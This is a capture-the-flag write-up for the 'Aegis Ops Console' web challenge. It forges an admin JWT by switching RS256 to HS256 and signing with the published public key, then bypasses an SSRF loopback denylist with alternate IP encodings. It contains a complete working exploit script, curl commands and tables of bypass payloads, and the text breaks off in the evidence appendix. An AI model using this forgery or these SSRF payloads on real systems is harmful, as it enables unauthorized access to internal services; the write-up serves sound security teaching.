# Aegis Ops Console — HackCTF Web Challenge Write-up

**Target:** `http://10.10.0.28:5000`
**Category:** Web
**Vulnerabilities:**
1. JWT algorithm confusion (`RS256` → `HS256`) using the published public key as an HMAC secret
2. Server-Side Request Forgery (SSRF) with a weak string-based loopback denylist
**Flag:** `HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}`
**Status:** Solved
**Date:** 2026-10-25

---

## 1. Executive Summary

Aegis Ops Console is an internal operations dashboard. The landing page advertises a demo analyst account (`analyst / analyst`), documents a small JSON API, and publishes the token-signing public key at `/pubkey.pem`.

The application uses RS256 JWTs for authentication. The verifier, however, trusts the `alg` field inside the token instead of pinning RS256. By changing the token algorithm to `HS256` and signing the token with the publicly available PEM public key, it was possible to forge an admin token. This is the classic **JWT algorithm confusion** attack.

With the forged admin token, the admin-only diagnostics endpoint `/console/fetch?url=...` became accessible. That endpoint performs a server-side HTTP request and is protected only by a string-based denylist for loopback hosts. Supplying the loopback address in an alternate numeric form (`http://2130706433:5000/internal/flag`) bypassed the denylist and returned the flag from the loopback-only `/internal/flag` endpoint.

The complete chain is:

```
published public key
        ↓
JWT algorithm confusion (RS256 → HS256)
        ↓
forged admin token
        ↓
admin-only /console/fetch SSRF
        ↓
alternate loopback encoding bypasses denylist
        ↓
http://127.0.0.1:5000/internal/flag
        ↓
HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}
```

---

## 2. Challenge Brief and Hints

The challenge description contained several deliberate hints:

> Aegis Ops Console is an internal operations dashboard. Analysts get a read-only view; the good stuff is admin-only, and the token-signing public key is published for "integration partners." Become admin, then use the admin diagnostics to reach something you shouldn't.

Mapping the hints to the likely attack path:

| Hint | Interpretation |
|---|---|
| "Analysts get a read-only view" | A low-privilege `analyst` role exists. |
| "the good stuff is admin-only" | A privilege escalation to `role=admin` is required. |
| "the token-signing public key is published" | The JWT verification key is available to attackers. This strongly suggests a JWT algorithm-confusion attack. |
| "use the admin diagnostics to reach something you shouldn't" | The admin diagnostics endpoint is an SSRF primitive. |
| Flag format `HackCTF{...}` | Standard HackCTF flag. |

The landing page then removed most of the guesswork by publishing an explicit API reference:

```text
POST /login              issue a session token
GET  /console            claims + operator briefing
GET  /console/fetch      server-side fetch (admin)
GET  /pubkey.pem         token signing public key
GET  /internal/flag      loopback only
```

It also provided the demo credentials:

```text
analyst / analyst
```

And it documented the token transport:

> Tokens are issued as RS256. Every request may carry the token as a cookie named `token` or as `Authorization: Bearer <token>`.

---

## 3. Environment and Tooling

| Item | Value |
|---|---|
| Target | `10.10.0.28:5000` |
| Network | HackCTF VPN (`hacklido-user1417.ovpn`) |
| Web server | `gunicorn` |
| Framework fingerprint | Flask-style 403 page and JSON API |
| Auth | JWT, RS256, delivered as `Authorization: Bearer` or `Cookie: token=` |
| Attack surface | `/login`, `/console`, `/console/fetch`, `/pubkey.pem`, `/internal/flag` |
| Tools used | `curl`, `python3`, `requests`, `hmac`, `hashlib`, `base64`, `json` |
| Working directory | `/tmp/opencode` |
| Reproducer | `exploit_aegis.py` (full script in §9) |

The VPN connection was already established. No source code was available, so the assessment was black-box.

---

## 4. Phase 0 — Connectivity Check

The first request was a simple connectivity and fingerprint check:

```bash
curl -sS -m 10 -i http://10.10.0.28:5000/
```

Response:

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 25 Oct 2026 13:09:04 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 7120
```

The response was a custom dark-themed dashboard page titled **Aegis Ops Console · HackCTF**. The server header confirmed `gunicorn`. The page advertised the demo account and the API endpoints listed above.

Two useful observations came from this first response:

1. The application is small and intentionally documented. That meant reading the page was more valuable than blind directory brute-forcing.
2. The landing page itself leaked the internal target path `/internal/flag` and described it as "loopback only." That is exactly the kind of endpoint an SSRF is meant to reach.

---

## 5. Phase 1 — Reconnaissance

### 5.1 Enumerating the documented entry points

The first quick probe enumerated the obvious paths:

```bash
for p in / /login /console /robots.txt /sitemap.xml \
         /.well-known/jwks.json /jwks.json /public.key /pubkey \
         /static/css/app.css; do
  curl -sS -m 10 -o /dev/null \
       -w "%{http_code} %{size_download} %{content_type}  $p\n" \
       "http://10.10.0.28:5000$p"
done
```

Results:

| Path | Status | Size | Content-Type | Notes |
|---|---:|---:|---|---|
| `/` | 200 | 7120 | `text/html` | Landing page and API reference |
| `/login` | 405 | 153 | `text/html` | GET not allowed; login is POST-only |
| `/console` | 401 | 27 | `application/json` | Authentication required |
| `/robots.txt` | 404 | 207 | `text/html` | Flask 404 page |
| `/sitemap.xml` | 404 | 207 | `text/html` | No sitemap |
| `/.well-known/jwks.json` | 404 | 207 | `text/html` | No JWKS |
| `/jwks.json` | 404 | 207 | `text/html` | No JWKS |
| `/public.key` | 404 | 207 | `text/html` | Wrong name |
| `/pubkey` | 404 | 207 | `text/html` | Wrong name |
| `/static/css/app.css` | 200 | 15887 | `text/css` | Styling only |

### 5.2 Failure: guessing common key paths

**What failed:** The initial assumption was that the public key might be exposed through a standard JWKS endpoint (`/.well-known/jwks.json`) or a conventional filename such as `/public.key` or `/pubkey`.

**Why it failed:** The challenge uses a custom filename, `/pubkey.pem`, which is not one of the usual JWKS conventions. All guessed variants returned 404.

**How the approach changed:** Instead of continuing to guess key locations, the landing page and its API reference were read carefully. The page explicitly listed:

```text
GET /pubkey.pem    token signing public key
```

Fetching that exact path returned the key. This was the first example of an important lesson in this challenge: **read the application's own documentation before brute-forcing.**

### 5.3 GET `/login` returned 405

**What failed:** A naive `GET /login` request returned:

```http
HTTP/1.1 405 METHOD NOT ALLOWED
Content-Type: text/html; charset=utf-8
Content-Length: 153
```

**Why it failed:** `/login` only accepts `POST`. The page is a single-page dashboard, not a traditional form-serving login page.

**How the approach changed:** The request was changed to a JSON `POST`:

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"analyst","password":"analyst"}
```

That returned a valid JWT.

### 5.4 Static JavaScript review

The landing page loaded `/static/js/app.js`. Reviewing it confirmed the API contract and the client-side handling:

- Login sends `POST /login` with JSON `{username, password}`.
- The token is read from `state.token` or the manual token input.
- `/console` is called with `Authorization: Bearer <token>`.
- `/console/fetch?url=` is called with the same `Authorization` header and a URL-encoded `url` parameter.
- The diagnostics input accepts any URL typed by the user.
- No signing secret or private key was present in the JavaScript. The only key-related operation was fetching `/pubkey.pem`.

Relevant behavior from `app.js`:

```javascript
fetch("/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: $("#username").value,
    password: $("#password").value
  })
})
```

```javascript
fetch("/console/fetch?url=" + encodeURIComponent(url),
      { headers: { "Authorization": "Bearer " + tok } })
```

This confirmed that `/console/fetch` takes an arbitrary URL and that the browser UI is only a convenience wrapper around the API. No additional client-side authorization check mattered.

### 5.5 The published public key

The key was retrieved with:

```bash
curl -sS http://10.10.0.28:5000/pubkey.pem
```

Response:

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1xs4YBrjTwG7MdH1EpJr
YQPKQCbe04S8Rcou+IOpadXTJErjeZk2yMk92aaifFI1vqflIqOP+5mu3sUHe78D
kALbFX+fWpUWOCvliFcNgvalp8HgaSTC3srkBZhEPkSysUbgdu6Y2/6iaZ8rOk9l
CtUGP/v609iVNwR9tHKUPlyd+ZP3GkYfle86vL312D4e8fQoytZFB5giDRQUmy/v
B4DyWeyVuHoqzFTd+waw8t3ZPrINiTdlxdK1RrWmSV+VpYcUqbkMzzDSUE+XmOz1
XOS9Ru9tbcPzXwaXrevn9RPSeAH1pA/Gy09x1up845RWQODPgYoEv3+UEjSJCYo5
4QIDAQAB
-----END PUBLIC KEY-----
```

The downloaded file was exactly **451 bytes**, including the trailing newline. Preserving the exact bytes later turned out to matter for the HMAC signature.

At this point the attack surface was clear:

```
analyst credentials
        + published public key
        + RS256 token
        = candidate for JWT algorithm confusion
```

---

## 6. Phase 2 — Baseline Authentication

### 6.1 Logging in as the analyst

```bash
curl -sS -X POST http://10.10.0.28:5000/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"analyst","password":"analyst"}'
```

Response:

```json
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmFseXN0Iiwicm9sZSI6ImFuYWx5c3QifQ.iTR41H0DwDflHZxWMguUD4tsM3ZdR-VJXF-bNC0FNmKQ4LcTT_Ftotagekhz5zHX6CPM0cHOVDTiW1_0Du6Rd63MdAURXXqWw89Lnp0eQTb5gjbCj5wOw2MSv2_ewORkoEU0hGK16G1NDgn00TcYaKI0TJxPZwtrG76QlPICZbLiHTA6syD3sSFS605bj65XMxtL6EqLpiDK6cAvYUj4QgInoCjBPa_YaiV5tgYUwihStqRBmhKUW_w8GIAPd6cPlOq2rMyIKz6uIkdP0b9bP2MS6q2mWCYL-5ZLPyf4TRyGQotXn95qv6ThZ8zhQk9yPUS0Qr_A1bKTPPPCdQcuTQ"}
```

Decoding the first two segments:

```json
{"alg":"RS256","typ":"JWT"}
{"sub":"analyst","role":"analyst"}
```

This revealed the authorization model directly:

- `sub` identifies the subject.
- `role` is the privilege level used by the application.
- The token is signed with RS256.

### 6.2 `/console` as the analyst

```bash
curl -sS http://10.10.0.28:5000/console \
     -H "Authorization: Bearer <analyst-token>"
```

Response:

```json
{
  "note": "Welcome, analyst (role=analyst). Admin diagnostics: /console/fetch?url=<url> can pull a URL for health checks. Internal-only services live on the loopback interface, e.g. the ops flag probe at http://127.0.0.1:5000/internal/flag (server-side only).",
  "user": {
    "role": "analyst",
    "sub": "analyst"
  }
}
```

This response was extremely helpful. It confirmed:

- The role is taken from the token.
- Admin diagnostics live at `/console/fetch`.
- An internal-only flag probe exists at `http://127.0.0.1:5000/internal/flag`.
- The application expects the attacker to reach that loopback URL from the server side.

### 6.3 `/console/fetch` as the analyst

Trying the diagnostics endpoint with the legitimate analyst token:

```bash
curl -sS -G http://10.10.0.28:5000/console/fetch \
     --data-urlencode 'url=http://2130706433:5000/internal/flag' \
     -H "Authorization: Bearer <analyst-token>"
```

Response:

```http
HTTP/1.1 403 FORBIDDEN
Content-Type: application/json

{"error":"admin role required for diagnostics"}
```

So the diagnostics endpoint performs a role check. The analyst token is not sufficient. The next problem was clear: **obtain a token with `role=admin`.**

### 6.4 Direct access to `/internal/flag`

Requesting the flag endpoint directly from the attack host:

```bash
curl -sS -i http://10.10.0.28:5000/internal/flag
```

Response:

```http
HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 213
```

The endpoint is protected by a loopback-only check, so it cannot be reached directly from the VPN IP. It only becomes reachable when the request originates from the server itself. This is exactly what the SSRF primitive provides.

---

## 7. Phase 3 — Forging an Admin Token

### 7.1 First idea: edit the payload

The most obvious idea was to take the analyst token and change:

```json
{"sub":"analyst","role":"analyst"}
```

to:

```json
{"sub":"admin","role":"admin"}
```

**What failed:** The token is signed with RS256. Changing the payload invalidates the signature. Without the private key, the modified token cannot produce a valid RS256 signature.

**Why it failed:** RS256 is an asymmetric signature scheme. The attacker has only the public key, which verifies signatures but cannot create them.

**How the approach changed:** Instead of attacking the RS256 signature directly, the next step was to attack the **verification logic** itself. The most common weakness in an application that publishes its public key is algorithm confusion.

### 7.2 Checking `alg: none`

As a quick sanity check, an unsigned token was tested:

```json
{"alg":"none","typ":"JWT"}
{"sub":"admin","role":"admin"}
```

The token had no signature segment. It was sent to `/console`:

```http
HTTP/1.1 401 UNAUTHORIZED
Content-Type: application/json

{"error":"no valid token"}
```

**Result:** rejected. The verifier requires a signature, so the trivial `alg=none` bypass does not work here.

**How the approach changed:** Since unsigned tokens were rejected, the next candidate was to make the verifier treat the known public key as a symmetric HMAC secret.

### 7.3 Algorithm confusion theory

RS256 and HS256 use different key types:

| Algorithm | Type | Key used to verify |
|---|---|---|
| RS256 | Asymmetric | RSA public key |
| HS256 | Symmetric | Shared secret |

A vulnerable JWT verifier might do something like:

```python
key = load_public_key()          # attacker knows this
alg = jwt_header["alg"]           # attacker controls this
jwt.decode(token, key, algorithms=[alg])
```

If the verifier allows the attacker to choose `alg`, the attacker can set it to `HS256`. The verifier then uses the public key PEM as an HMAC secret. Because that public key is published, the attacker can compute the same HMAC and produce a valid signature.

The vulnerability is not that the public key is public. Public keys are supposed to be public. The vulnerability is that the verifier **trusts the `alg` header** and does not pin the expected algorithm to RS256.

### 7.4 Building the forged token

A small Python script was used to create the HS256 token. The HMAC key was the raw bytes of the downloaded PEM file.

```python
import base64
import hashlib
import hmac
import json

def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def forge_hs256(payload: dict, secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}

    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + b"."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )

    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64url(signature)).decode()

pubkey = open("pub.pem", "rb").read()   # exact bytes from /pubkey.pem
token = forge_hs256({"sub": "admin", "role": "admin"}, pubkey)
print(token)
```

The exact bytes of the PEM matter. The downloaded file was 451 bytes, including the trailing newline. Four candidate key encodings were prepared in the forge script:

1. Raw PEM bytes as served, including the trailing newline
2. PEM with leading/trailing whitespace stripped
3. PEM with newlines removed
4. Stripped PEM with a single trailing newline added back

The first candidate worked immediately. That strongly suggests the server uses the PEM file's bytes directly as the HMAC key when it is tricked into HS256 mode.

Generated token:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Gz4qV8R4f1rG5IuIWx9ZXIjErW5auIQlbtY-vx7Fp6U
```

Decoded:

```json
{"alg":"HS256","typ":"JWT"}
{"sub":"admin","role":"admin"}
```

### 7.5 Using the forged token

The forged token was first sent as a Bearer token:

```bash
curl -sS http://10.10.0.28:5000/console \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Gz4qV8R4f1rG5IuIWx9ZXIjErW5auIQlbtY-vx7Fp6U"
```

Response:

```json
{
  "note": "Welcome, admin (role=admin). Admin diagnostics: /console/fetch?url=<url> can pull a URL for health checks. Internal-only services live on the loopback interface, e.g. the ops flag probe at http://127.0.0.1:5000/internal/flag (server-side only).",
  "user": {
    "role": "admin",
    "sub": "admin"
  }
}
```

The forged token was also accepted as a cookie:

```bash
curl -sS http://10.10.0.28:5000/console \
     -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Gz4qV8R4f1rG5IuIWx9ZXIjErW5auIQlbtY-vx7Fp6U"
```

Response: `HTTP 200` with the same admin briefing.

**Privilege escalation achieved.** The application now treats the attacker as an admin because it trusts the `role` claim in a token that the attacker signed using the published public key.

---

## 8. Phase 4 — SSRF to the Loopback-Only Flag Endpoint

### 8.1 The diagnostics primitive

With the forged admin token, `/console/fetch` became reachable:

```bash
curl -sS -G http://10.10.0.28:5000/console/fetch \
     --data-urlencode 'url=http://127.0.0.1:5000/internal/flag' \
     -H "Authorization: Bearer <forged-admin-token>"
```

Response:

```http
HTTP/1.1 400 BAD REQUEST
Content-Type: application/json

{"error":"blocked: loopback host not allowed"}
```

**What failed:** The application explicitly blocked the literal loopback host.

**Why it failed:** The endpoint applies a denylist to the supplied URL and rejects hosts that look like loopback addresses. At least the strings `127.0.0.1` and `localhost` were blocked.

**How the approach changed:** Instead of fighting the denylist directly, the next step was to determine **what exactly** the filter checks. If it compares hostname strings, then any alternative representation of the same IP that does not contain the blocked string may pass. If it resolves DNS first, then a DNS alias should be blocked too. Testing both hypotheses would reveal the filter design.

### 8.2 Failed SSRF variations

The first batch of bypass attempts produced a mix of failures and useful information:

| Payload URL | Result | Interpretation |
|---|---|---|
| `http://127.0.0.1:5000/internal/flag` | `400 blocked: loopback host not allowed` | Literal IPv4 is denied |
| `http://localhost:5000/internal/flag` | `400 blocked: loopback host not allowed` | Literal `localhost` is denied |
| `http://127.0.0.1:5000/internal/flag/` | `400 blocked` | Path changes do not matter; host is still blocked |
| `http://127.0.0.1:5000/internal/flag?x=1` | `400 blocked` | Query changes do not matter |
| `http://127.0.0.1:5000/internal/flag%00` | `400 blocked` | Null byte does not evade the host check |
| `http://127.0.0.1:5000/internal/flag#` | `400 blocked` | Fragment does not evade the host check |
| `http://127.0.0.1:5000/./internal/flag` | `400 blocked` | Path normalization is irrelevant |
| `http://127.0.0.1:5000//internal/flag` | `400 blocked` | Duplicate slash does not help |
| `http://[::ffff:127.0.0.1]:5000/internal/flag` | `400 blocked` | The IPv4-mapped IPv6 form still contains `127.0.0.1` |
| `http://127.0.0.1.nip.io:5000/internal/flag` | `400 blocked` | DNS name contains the blocked string |
| `http://127.0.0.1.sslip.io:5000/internal/flag` | `400 blocked` | Same |
| `http://localhost.localdomain:5000/internal/flag` | `400 blocked` | Contains `localhost` |
| `http://[::1]:5000/internal/flag` | `fetch failed: ConnectionError` | IPv6 loopback is not reachable; gunicorn likely listens on IPv4 only |

Two conclusions came from this table:

1. The filter is almost certainly a **string-based hostname check**, not a proper IP validation. Any hostname containing `127.0.0.1` or `localhost` is rejected, regardless of path.
2. IPv6 is a dead end on this target because the service is not listening on `::1`.

### 8.3 The successful bypass strategy

The next batch used alternative IPv4 representations that resolve to `127.0.0.1` but do not contain the blocked substrings:

| Payload URL | Result |
|---|---|
| `http://2130706433:5000/internal/flag` | `200` + flag |
| `http://0x7f000001:5000/internal/flag` | `200` + flag |
| `http://0177.0.0.1:5000/internal/flag` | `200` + flag |
| `http://127.1:5000/internal/flag` | `200` + flag |
| `http://127.0.1:5000/internal/flag` | `200` + flag |
| `http://0:5000/internal/flag` | `200` + flag |
| `http://0.0.0.0:5000/internal/flag` | `200` + flag |
| `http://localtest.me:5000/internal/flag` | `200` + flag |

The decimal form was the cleanest:

```bash
curl -sS -G http://10.10.0.28:5000/console/fetch \
     --data-urlencode 'url=http://2130706433:5000/internal/flag' \
     -H "Authorization: Bearer <forged-admin-token>"
```

Response:

```http
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/plain; charset=utf-8
Content-Length: 45

HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}
```

### 8.4 Why the bypass works

Different URL parsers and network stacks accept several IPv4 representations:

| Form | Value |
|---|---|
| `2130706433` | Decimal 32-bit representation of `127.0.0.1` |
| `0x7f000001` | Hexadecimal representation |
| `0177.0.0.1` | Octal first octet |
| `127.1` | Short form; missing octets are treated as zero |
| `0` | Treated as `0.0.0.0`, which routes to local services |
| `0.0.0.0` | Wildcard/local address on Linux |
| `localtest.me` | Public DNS name that resolves to `127.0.0.1` |

The successful `localtest.me` request is especially important evidence. That hostname resolves to `127.0.0.1`, yet it was allowed. This proves the filter did **not** resolve the hostname and validate the resulting IP. It only inspected the hostname string. A proper SSRF defense must resolve the hostname and validate the resolved address, not just pattern-match the text.

The successful numeric forms worked because the underlying HTTP client or URL parser normalized them to `127.0.0.1` at connection time, after the string filter had already allowed them.

---

## 9. Full Exploit Script

The following script performs the entire chain from scratch, with no hardcoded token:

```python
#!/usr/bin/env python3
"""
Aegis Ops Console - full exploit chain
1) fetch the published RS256 public key
2) log in as the demo analyst to learn the token shape
3) forge an HS256 token using the public key PEM as the HMAC secret
4) use the admin diagnostics SSRF with an alternate loopback encoding
"""
import base64
import hashlib
import hmac
import json

import requests

BASE = "http://10.10.0.28:5000"


def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def forge_hs256(payload: dict, secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + b"."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64url(signature)).decode()


def main() -> None:
    s = requests.Session()

    # Step 1: the public key is intentionally published for "integration partners"
    pubkey = s.get(f"{BASE}/pubkey.pem", timeout=10).content
    print(f"[+] fetched public key ({len(pubkey)} bytes)")

    # Step 2: demo login, just to confirm the API and token format
    login = s.post(
        f"{BASE}/login",
        json={"username": "analyst", "password": "analyst"},
        timeout=10,
    )
    login.raise_for_status()
    analyst_token = login.json()["token"]
    print(f"[+] analyst token: {analyst_token[:40]}...")

    # Step 3: JWT algorithm confusion. The server verifies RS256 with this
    # public key; by switching alg to HS256 we make it use the public PEM as
    # an HMAC secret that we also know.
    admin_token = forge_hs256({"sub": "admin", "role": "admin"}, pubkey)
    print(f"[+] forged admin token: {admin_token}")

    console = s.get(
        f"{BASE}/console",
        headers={"Authorization": f"Bearer {admin_token}"},
        timeout=10,
    )
    print(f"[+] /console -> HTTP {console.status_code}")
    print(json.dumps(console.json(), indent=2))

    # Step 4: SSRF. "127.0.0.1" and "localhost" are blocked as strings, but
    # the decimal form of 127.0.0.1 is not.
    target = "http://2130706433:5000/internal/flag"
    flag_resp = s.get(
        f"{BASE}/console/fetch",
        params={"url": target},
        headers={"Authorization": f"Bearer {admin_token}"},
        timeout=10,
    )
    print(f"[+] /console/fetch?url={target} -> HTTP {flag_resp.status_code}")
    print(f"[+] body: {flag_resp.text}")


if __name__ == "__main__":
    main()
```

Observed output:

```text
[+] fetched public key (451 bytes)
[+] analyst token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
[+] forged admin token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Gz4qV8R4f1rG5IuIWx9ZXIjErW5auIQlbtY-vx7Fp6U
[+] /console -> HTTP 200
{
  "note": "Welcome, admin (role=admin). Admin diagnostics: /console/fetch?url=<url> can pull a URL for health checks. Internal-only services live on the loopback interface, e.g. the ops flag probe at http://127.0.0.1:5000/internal/flag (server-side only).",
  "user": {
    "role": "admin",
    "sub": "admin"
  }
}
[+] /console/fetch?url=http://2130706433:5000/internal/flag -> HTTP 200
[+] body: HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}
```

---

## 10. Attack Chain Diagram

```text
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Recon                                                            │
│    GET /                    → landing page + API reference          │
│    GET /pubkey.pem          → RS256 public key (451 bytes)          │
│    POST /login analyst      → RS256 token {role: analyst}           │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 2. JWT algorithm confusion                                          │
│    header.alg = HS256                                               │
│    HMAC key   = /pubkey.pem bytes                                   │
│    payload    = {"sub":"admin","role":"admin"}                      │
│                                                                     │
│    server verifies with the published key as a shared secret        │
│    → forged admin token accepted                                    │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 3. Admin SSRF                                                       │
│    GET /console/fetch?url=http://127.0.0.1:5000/internal/flag       │
│    → 400 blocked: loopback host not allowed                         │
│                                                                     │
│    filter checks hostname string, not resolved IP                   │
│    → use http://2130706433:5000/internal/flag                       │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 4. Flag                                                             │
│    HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 11. Failure Log and Approach Changes

This section consolidates every dead end and the reasoning used to move past it.

### 11.1 `GET /login` returned 405

- **Attempt:** requested `/login` as a normal page.
- **Result:** `405 METHOD NOT ALLOWED`.
- **Diagnosis:** login is an API endpoint, not a page renderer.
- **Change:** sent `POST /login` with `Content-Type: application/json` and the demo credentials.

### 11.2 Guessing standard public-key paths

- **Attempt:** `/.well-known/jwks.json`, `/jwks.json`, `/public.key`, `/pubkey`.
- **Result:** all `404`.
- **Diagnosis:** the challenge uses a custom filename.
- **Change:** read the landing page's API reference, which explicitly listed `/pubkey.pem`. Fetching that succeeded.

### 11.3 Trying to tamper with the analyst token payload

- **Attempt:** change `role` to `admin` in the decoded payload.
- **Result:** RS256 signature would no longer match.
- **Diagnosis:** the private key is required to sign an RS256 token; only the public key is available.
- **Change:** stop attacking the payload and start attacking the verifier's algorithm handling.

### 11.4 Trying `alg: none`

- **Attempt:** unsigned token with `alg: none` and admin claims.
- **Result:** `401 {"error":"no valid token"}`.
- **Diagnosis:** the verifier requires a signature; `none` is not accepted.
- **Change:** use HS256 and the published public key as the HMAC secret.

### 11.5 Forging HS256 with the public key

- **Attempt:** HMAC-SHA256 over `header.payload` using the raw PEM bytes from `/pubkey.pem`.
- **Result:** `200` from `/console`, with `role=admin`.
- **Diagnosis:** the verifier accepts a token whose `alg` is `HS256` and uses the public key as the symmetric secret.
- **Change:** no further JWT work needed; proceed to the admin-only SSRF.

### 11.6 Literal loopback blocked in the SSRF

- **Attempt:** `http://127.0.0.1:5000/internal/flag` and `http://localhost:5000/internal/flag`.
- **Result:** `400 {"error":"blocked: loopback host not allowed"}`.
- **Diagnosis:** a denylist rejects those host strings.
- **Change:** test whether the filter resolves DNS or only inspects the hostname string.

### 11.7 Path and encoding tricks on the blocked host

- **Attempts:** trailing slash, query string, `%00`, fragment, `/./`, `//`.
- **Result:** all blocked because the host portion remained `127.0.0.1`.
- **Diagnosis:** the filter correctly identifies the host and is not confused by path variations.
- **Change:** stop trying to mutate the path; mutate the host representation.

### 11.8 IPv6 variants

- **Attempts:** `[::ffff:127.0.0.1]` and `[::1]`.
- **Result:** the mapped form was blocked; `[::1]` produced `fetch failed: ConnectionError`.
- **Diagnosis:** the mapped form still contains the blocked string `127.0.0.1`, and the service is not listening on IPv6 loopback.
- **Change:** abandon IPv6 and return to IPv4 alternative representations.

### 11.9 DNS aliases containing the blocked string

- **Attempts:** `127.0.0.1.nip.io`, `127.0.0.1.sslip.io`, `localhost.localdomain`.
- **Result:** all blocked.
- **Diagnosis:** these strings contain `127.0.0.1` or `localhost`, so the same denylist catches them.
- **Change:** use a DNS alias that does not contain the blocked text, or use a numeric representation.

### 11.10 Decimal loopback representation

- **Attempt:** `http://2130706433:5000/internal/flag`.
- **Result:** `200` and the flag.
- **Diagnosis:** the filter only matched textual loopback names; the HTTP client normalized the decimal integer to `127.0.0.1` when connecting.
- **Change:** none needed. Confirm with additional forms and finish.

### 11.11 Confirming the filter design with `localtest.me`

- **Attempt:** `http://localtest.me:5000/internal/flag`.
- **Result:** `200` and the flag.
- **Diagnosis:** `localtest.me` resolves to `127.0.0.1`, but the filter allowed it because the hostname text does not contain a blocked string. This proves the filter never resolves the hostname.
- **Change:** document this as the root cause and use it in the remediation advice.

---

## 12. Evidence Appendix

### 12.1 Landing page (excerpt)

```http
GET / HTTP/1.1
Host: 10.10.0.28:5000

HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
```

Relevant content:

```html
<p>
  POST credentials to <code>/login</code> to receive a session token, then talk
  to the console API at <code>/console</code>. The console also exposes a
  diagnostics fetcher for health checks. Demo account:
  <code>analyst / analyst</code>.
</p>
```

```html
<div class="endpoint"><span class="method method-post">POST</span><span class="path">/login</span><span class="desc">issue a session token</span></div>
<div class="endpoint"><span class="method method-get">GET</span><span class="path">/console</span><span class="desc">claims + operator briefing</span></div>
<div class="endpoint"><span class="method method-get">GET</span><span class="path">/console/fetch</span><span class="desc">server-side fetch (admin)</span></div>
<div class="endpoint"><span class="method method-get">GET</span><span class="path">/pubkey.pem</span><span class="desc">token signing public key</span></div>
<div class="endpoint"><span class="method method-get">GET</span><span class="path">/internal/flag</span><span class="desc">loopback only</span></div>
```

### 12.2 Login request and response

```http
POST /login HTTP/1.1
Host: 10.10.0.28:5000
Content-Type: application/json

{"username":"analyst","password":"analyst"}
```

```http
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: application/json
Content-Length: 439

{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

### 12.3 Analyst `/console`

```http
GET /console HTTP/1.1
Authorization: Bearer <analyst-token>

HTTP/1.1 200 OK
Content-Type: application/json

{"note":"Welcome, analyst (role=analyst). Admin diagnostics: /console/fetch?url=<url> can pull a URL for health checks. Internal-only services live on the loopback interface, e.g. the ops flag probe at http://127.0.0.1:5000/internal/flag (server-side only).","user":{"role":"analyst","sub":"analyst"}}
```

### 12.4 Analyst diagnostics attempt

```http
GET /console/fetch?url=http%3A%2F%2F2130706433%3A5000%2Finternal%2Fflag HTTP/1.1
Authorization: Bearer <analyst-token>

HTTP/1.1 403 FORBIDDEN
Content-Type: application/json

{"error":"admin role required for diagnostics"}
```

### 12.5 Direct flag access

```http
GET /internal/flag HTTP/1.1
Host: 10.10.0.28:5000

HTTP/1.1 403 FORBIDDEN
Content-Type: text/html; charset=utf-8
```

### 12.6 Blocked SSRF

```http
GET /console/fetch?url=http%3A%2F%2F127.0.0.1%3A5000%2Finternal%2Fflag HTTP/1.1
Authorization: Bearer <forged-admin-token>

HTTP/1.1 400 BAD REQUEST
Content-Type: application/json

{"error":"blocked: loopback host not allowed"}
```

### 12.7 Successful SSRF

```http
GET /console/fetch?url=http%3A%2F%2F2130706433%3A5000%2Finternal%2Fflag HTTP/1.1
Authorization: Bearer <forged-admin-token>

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 45

HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}
```

### 12.8 Forged admin claims

```json
